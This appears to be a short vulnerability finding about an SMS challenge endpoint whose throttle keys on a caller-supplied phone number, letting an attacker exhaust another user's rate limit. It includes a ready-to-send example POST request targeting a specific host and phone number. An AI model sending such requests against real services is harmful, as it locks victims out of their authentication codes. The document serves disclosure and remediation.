diagnosis: SendSMSChallengeView restricts SMS dispatch frequency using SMSVerificationThrottle. The throttle's get_cache_key() directly uses request.data.get('phone_number') without checking if that phone number belongs to request.user. An attacker can flood requests targeting another user's known telephone number, exhaust their rate limit bucket, and prevent the victim from receiving legitimate authentication codes.
exploit_request:
POST /api/auth/sms-challenge/ HTTP/1.1
Host: secure.quickauth.io
Authorization: Bearer 33e2d1c0...
Content-Type: application/json

{"phone_number": "+15550192834"}
